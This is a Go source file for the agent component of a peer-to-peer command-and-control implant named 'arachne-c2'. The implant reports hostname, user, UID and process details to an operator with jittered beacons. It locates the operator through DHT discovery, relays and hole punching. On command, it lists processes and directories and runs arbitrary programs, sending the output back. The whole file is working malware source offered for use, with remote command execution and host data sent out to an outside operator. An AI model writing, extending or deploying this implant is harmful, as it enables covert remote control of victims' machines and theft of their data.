package core

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/peer"
	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
	"github.com/multiformats/go-multiaddr"
	"google.golang.org/protobuf/proto"

	arachnepb "github.com/portbuster1337/arachne-c2/protobuf/arachnepb"
	"github.com/portbuster1337/arachne-c2/pkg/cryptography"
	"github.com/portbuster1337/arachne-c2/pkg/transport"
)

type Agent struct {
	node        *transport.Node
	messenger   *transport.Messenger
	keys        *cryptography.ImplantKey
	operatorPub crypto.PubKey
	config      AgentConfig
	ctx         context.Context
	cancel      context.CancelFunc
}

type AgentConfig struct {
	OperatorKeyFile  string
	OperatorAddr     string
	BeaconInterval   time.Duration
	BeaconJitter     time.Duration
	ReconnectBackoff time.Duration
	RelayAddrs       []string
}

func DefaultAgentConfig() AgentConfig {
	return AgentConfig{
		OperatorKeyFile:  "operator.pub",
		BeaconInterval:   10 * time.Second,
		BeaconJitter:     5 * time.Second,
		ReconnectBackoff: 5 * time.Second,
	}
}

func loadOperatorPubKey(cfg AgentConfig) (crypto.PubKey, error) {
	if len(embeddedOperatorPubKey) > 0 {
		return cryptography.PubKeyFromBytes(embeddedOperatorPubKey)
	}
	pubKeyData, err := os.ReadFile(cfg.OperatorKeyFile)
	if err != nil {
		return nil, fmt.Errorf("read operator key %s: %w", cfg.OperatorKeyFile, err)
	}
	return cryptography.PubKeyFromBytes(pubKeyData)
}

func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
	ctx, cancel := context.WithCancel(ctx)

	operatorPub, err := loadOperatorPubKey(cfg)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("load operator pubkey: %w", err)
	}

	keys, err := cryptography.GenerateImplantKey(operatorPub)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("generate implant key: %w", err)
	}

	nodeCfg := transport.NodeConfig{
		ListenAddr:     "/ip4/0.0.0.0/tcp/0",
		BootstrapPeers: transport.DefaultBootstrapAddrs(),
		EnableRelay:    true,
		EnableMDNS:     true,
		EnableDHT:      true,
		RelayAddrs:     cfg.RelayAddrs,
	}

	node, err := transport.NewNode(ctx, nodeCfg,
		libp2p.NoTransports,
		libp2p.Transport(tcp.NewTCPTransport),
		libp2p.EnableHolePunching(),
	)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("create node: %w", err)
	}

	a := &Agent{
		keys:        keys,
		operatorPub: operatorPub,
		node:        node,
		config:      cfg,
		ctx:         ctx,
		cancel:      cancel,
	}

	a.messenger = transport.NewImplantMessenger(ctx, node, keys, operatorPub)
	a.messenger.SetHandler(a.handleCommand)

	return a, nil
}

func (a *Agent) Start() error {
	log.Printf("[implant] PeerID: %s", a.node.ID().String())
	log.Printf("[implant] Operator: %s", a.messenger.BeaconTopic())

	if a.config.OperatorAddr != "" {
		m, err := multiaddr.NewMultiaddr(a.config.OperatorAddr)
		if err != nil {
			return fmt.Errorf("parse operator addr %s: %w", a.config.OperatorAddr, err)
		}
		pi, err := peer.AddrInfoFromP2pAddr(m)
		if err != nil {
			return fmt.Errorf("parse operator peer info: %w", err)
		}
		if err := a.node.ConnectToPeer(a.ctx, *pi); err != nil {
			return fmt.Errorf("connect to operator: %w", err)
		}
		log.Printf("[implant] connected to operator directly: %s", pi.ID.String())
	}

	log.Printf("[implant] starting discovery...")
	if err := a.node.StartDiscovery(); err != nil {
		return fmt.Errorf("discovery: %w", err)
	}

	log.Printf("[implant] subscribing to commands...")
	if err := a.messenger.ListenCommands(a.ctx); err != nil {
		return fmt.Errorf("listen commands: %w", err)
	}

	ns := a.messenger.RendezvousString()
	if a.node.DHT != nil {
		go a.discoverOperatorLoop(ns)
	}

	go a.beaconLoop()

	return nil
}

func (a *Agent) discoverOperatorLoop(ns string) {
	log.Printf("[implant] DHT discovery started for: %s", ns)
	for {
		if a.node.DHT == nil || len(a.node.DHT.RoutingTable().ListPeers()) == 0 {
			log.Printf("[implant] DHT routing table empty, waiting for bootstrap...")
			select {
			case <-a.ctx.Done():
				return
			case <-time.After(5 * time.Second):
			}
			continue
		}

		log.Printf("[implant] querying DHT for operator...")
		peerCh, err := a.node.FindPeers(a.ctx, ns)
		if err != nil {
			log.Printf("[implant] DHT find peers: %v", err)
			select {
			case <-a.ctx.Done():
				return
			case <-time.After(15 * time.Second):
			}
			continue
		}

		found := false
		for pi := range peerCh {
			if pi.ID == a.node.ID() || len(pi.Addrs) == 0 {
				continue
			}
			found = true
			log.Printf("[implant] found candidate %s with %d addrs", pi.ID.String(), len(pi.Addrs))
			if err := a.node.ConnectToPeer(a.ctx, pi); err != nil {
				log.Printf("[implant] DHT connect to %s: %v", pi.ID.String(), err)
				continue
			}
			log.Printf("[implant] connected to operator via DHT: %s", pi.ID.String())
		}
		if !found {
			log.Printf("[implant] no operator found on DHT yet, retrying...")
		}

		select {
		case <-a.ctx.Done():
			return
		case <-time.After(15 * time.Second):
		}
	}
}

func (a *Agent) beaconLoop() {
	for {
		a.sendBeaconRegister()

		jitter := time.Duration(rand.Int63n(int64(a.config.BeaconJitter)))
		sleep := a.config.BeaconInterval + jitter

		select {
		case <-a.ctx.Done():
			return
		case <-time.After(sleep):
		}
	}
}

func (a *Agent) sendBeaconRegister() {
	hostname, _ := os.Hostname()
	reg := &arachnepb.Register{
		Name:     hostname,
		Hostname: hostname,
		Username: os.Getenv("USER"),
		UID:      fmt.Sprintf("%d", os.Getuid()),
		GID:      fmt.Sprintf("%d", os.Getgid()),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      int32(os.Getpid()),
		Filename: os.Args[0],
		Version:  "0.1.0",
		Locale:   os.Getenv("LANG"),
		PeerID: int64(os.Getpid()),
		ActiveC2: a.node.ID().String(),
	}

	data, err := proto.Marshal(reg)
	if err != nil {
		log.Printf("[implant] marshal register: %v", err)
		return
	}

	env := a.messenger.CreateEnvelope(0, data)
	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
		log.Printf("[implant] send register: %v", err)
		return
	}
}

func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, senderPub crypto.PubKey) {
	if err := transport.VerifyEnvelope(env, a.operatorPub); err != nil {
		log.Printf("[implant] dropped command — %v", err)
		return
	}

	log.Printf("[implant] received command type=%d", env.Type)

	switch env.Type {
	case 1:
		a.handlePs(env)
	case 2:
		a.handleLs(env)
	case 3:
		a.handleExecute(env)
	default:
		log.Printf("[implant] unknown cmd type=%d", env.Type)
	}
}

func (a *Agent) sendResult(resultType uint32, data []byte) {
	env := a.messenger.CreateEnvelope(resultType, data)
	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
		log.Printf("[implant] send result: %v", err)
	}
}

func (a *Agent) handlePs(env *arachnepb.Envelope) {
	result := &arachnepb.Ps{}
	result.Processes = listProcesses()
	data, _ := proto.Marshal(result)
	log.Printf("[implant] ps result: %d processes", len(result.Processes))
	a.sendResult(1, data)
}

func (a *Agent) handleLs(env *arachnepb.Envelope) {
	req := &arachnepb.LsReq{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		return
	}

	result := &arachnepb.Ls{Path: req.Path}
	entries, err := os.ReadDir(req.Path)
	if err != nil {
		result.Exists = false
	} else {
		result.Exists = true
		for _, e := range entries {
			info, _ := e.Info()
			fi := &arachnepb.FileInfo{
				Name:  e.Name(),
				IsDir: e.IsDir(),
			}
			if info != nil {
				fi.Size = info.Size()
				fi.ModTime = info.ModTime().Unix()
				fi.Mode = info.Mode().String()
			}
			result.Files = append(result.Files, fi)
		}
	}

	data, _ := proto.Marshal(result)
	log.Printf("[implant] ls %s: %d entries", req.Path, len(result.Files))
	a.sendResult(2, data)
}

func (a *Agent) handleExecute(env *arachnepb.Envelope) {
	req := &arachnepb.ExecuteReq{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		return
	}

	result := &arachnepb.Execute{}
	cmd := exec.CommandContext(a.ctx, req.Path, req.Args...)
	if req.Output {
		out, err := cmd.CombinedOutput()
		if err != nil {
			result.Status = 1
			result.Stderr = []byte(err.Error())
		}
		result.Stdout = out
	} else {
		if err := cmd.Start(); err != nil {
			result.Status = 1
			result.Stderr = []byte(err.Error())
		} else {
			result.Pid = uint32(cmd.Process.Pid)
			go cmd.Wait()
		}
	}

	data, _ := proto.Marshal(result)
	log.Printf("[implant] execute %s: exit=%d stdout=%d", req.Path, result.Status, len(result.Stdout))
	a.sendResult(3, data)
}

func (a *Agent) Close() error {
	a.cancel()
	return a.node.Close()
}
